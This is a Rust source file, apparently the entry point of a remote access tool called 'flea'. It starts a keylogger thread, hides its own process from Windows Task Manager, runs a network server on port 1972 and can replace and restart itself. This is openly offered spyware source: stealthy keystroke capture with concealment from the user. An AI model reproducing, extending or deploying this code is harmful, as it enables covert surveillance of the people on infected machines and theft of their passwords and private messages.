//#![windows_subsystem = "windows"]

mod updater;

extern crate exitcode;
extern crate getopts;

use std::{thread, env};
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use flealib::commandprocessor::RESTART_FILENAME;
use flealib::fleaserver::FleaServer;
use flealib::keylogger::*;
use getopts::Options;
use local_ip_address::local_ip;

#[macro_use]
extern crate log;

//Change the port number of the server according to your needs
const SERVER_PORT: &'static str = ":1972";
const BACKUP_FILENAME: &'static str = "flea.bak";
const UPDATE_FILENAME: &'static str = "flea.upd";

#[cfg(target_os = "windows")]
const FLEA_FILE_NAME: &'static str = "flea.exe";

#[cfg(target_os = "linux")]
const FLEA_FILE_NAME: &'static str = "flea";

fn print_usage(program: &str, opts: Options) 
{
    let brief = format!("Usage: {} [options]", program);
    println!("{}", opts.usage(&brief));
}

fn main() 
{
    env_logger::init();

    info!("Start");

    let args: Vec<String> = env::args().collect();
    let mut pdir = env::current_exe().unwrap().to_str().unwrap().to_string();

    //Remove DOS device path prefix
    pdir = pdir.replace("\\\\?\\", "");
    pdir = pdir.replace("\\\\.\\", "");

    info!("Program path: {}", &pdir);

    //get current system directory separator
    let separator = std::path::MAIN_SEPARATOR.to_string();

    let v: Vec<&str> = pdir.split(&separator).collect();    
    let mut program_dir: String = String::new();

    for i in 0..v.len() - 1
    {
        if v[i].is_empty()
        {
            continue;
        }

        #[cfg(target_os = "windows")]
        if program_dir.is_empty()
        {
            program_dir.push_str(&v[i]);
            continue;
        }

        program_dir.push_str(&format!("{}{}", separator, &v[i]));
    }

    if program_dir.is_empty()
    {
        //if the path is empty, get the current directory
        program_dir = env::current_dir().unwrap().to_str().unwrap().to_string();
    }
    else
    {
        //set the current directory to the program directory
        let info = format!("Couldn't set the current directory! (path={})", &program_dir);
        env::set_current_dir(&program_dir).expect(&info);
    }

    //Check if backup file exists
    if std::path::Path::new(BACKUP_FILENAME).exists()
    {
        //Delete the backup file
        if let Ok(_) = std::fs::remove_file(BACKUP_FILENAME) {}
    }
 
    //Check if restart file exists
    if std::path::Path::new(RESTART_FILENAME).exists()
    {
        //Delete the restart file
        if let Ok(_) = std::fs::remove_file(RESTART_FILENAME) {}
    }

    //Finds if there is update available
    updater::find_update(&program_dir, UPDATE_FILENAME).map(|x| 
    {
        info!("Found update: {}", x);
         //Rename current file to the backup name
        std::fs::rename(FLEA_FILE_NAME, BACKUP_FILENAME).expect("Couldn't rename the current file!");
        //Rename the update file to the current executable name
        std::fs::rename(x, FLEA_FILE_NAME).expect("Couldn't rename the update file!");        
        //Starts a new process of itself
        updater::start_new_process(&program_dir, FLEA_FILE_NAME.to_string());
        //Exits the current process
        std::process::exit(exitcode::OK);
    });

    let my_local_ip = local_ip().unwrap();
    let program = args[0].clone();
    
    let mut opts = Options::new();

    opts.optopt("s", "server", "Server IP to listen on", "Leave empty to listen on the host ip address");

    let matches = match opts.parse(&args[1..]) 
    {
        Ok(m) => { m }
        Err(f) => { println!("{}", f.to_string()); print_usage(&program, opts); return }
    };

    let host_address = matches.opt_str("s");

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    //Set CTRL-C handler
    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C handler");

    let dir = env::current_dir().expect("Couldn't get current directory!");
    let current_path = dir.join(flealib::keylogger::KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();

    remove_keylog_file(&current_path);
    
    let mut address = my_local_ip.to_string();

    if host_address.is_some()
    {
        address = host_address.unwrap();
    }
    
    address += &String::from(SERVER_PORT);

    let key_logger_data = Arc::new(Mutex::new(Keylogger{quit: false}));
    let kl = Arc::clone(&key_logger_data);

    let handle = thread::spawn(move|| {
        run(current_path, kl);
    });
    
    //Hide flea process in Task Manager (only on Windows. Must be ran as admin)
    let kl2 = Arc::clone(&key_logger_data);
    let handle2 = thread::spawn(move|| {
        flealib::hideflea::hide_flea_process(kl2);
    });

    let flea_server = FleaServer{};
    
    flea_server.start(&address, &running);

    key_logger_data.lock().unwrap().quit = true;

    handle.join().unwrap();
    handle2.join().unwrap();

    info!("Stop");
    
    //if restart file exists, start a new process of itself
    if std::path::Path::new(RESTART_FILENAME).exists()
    {
        //Delete the restart file
        if let Ok(_) = std::fs::remove_file(RESTART_FILENAME) {}
        //Starts a new process of itself
        updater::start_new_process(&program_dir, FLEA_FILE_NAME.to_string());

        info!("Restart");
    }

    std::process::exit(exitcode::OK);
}
